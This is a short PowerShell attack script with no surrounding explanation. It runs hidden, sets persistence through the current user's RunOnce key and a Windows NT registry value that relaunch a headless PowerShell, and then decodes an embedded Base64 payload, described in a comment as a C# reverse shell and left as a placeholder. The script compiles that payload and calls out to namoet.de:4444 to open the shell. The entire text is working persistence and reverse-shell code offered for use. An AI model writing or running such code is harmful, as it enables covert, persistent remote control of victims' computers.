powershell -nop -w hidden -c "
# Set persistence
$payload = '$MyInvocation.MyCommand.Definition';
$regRunOnce = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce';
$regWindows = 'HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Windows';
$command = 'conhost.exe --headless powershell -nop -w hidden -c ' + [char]34 + $payload + [char]34;

Set-ItemProperty -Path $regRunOnce -Name 'windows' -Value 'conhost.exe --headless powershell -nop -w hidden -c cmd /c (Get-ItemProperty -Path ''' + $regWindows + ''').win';
Set-ItemProperty -Path $regWindows -Name 'win' -Value $command;

# Decode and run embedded C# reverse shell
$b64Payload = '...';  # Put actual Base64-encoded shellcode here
$bytes = [System.Convert]::FromBase64String($b64Payload);
$code = [System.Text.Encoding]::UTF8.GetString($bytes);
Add-Type -TypeDefinition $code;
[B]::ma('namoet.de:4444');
"
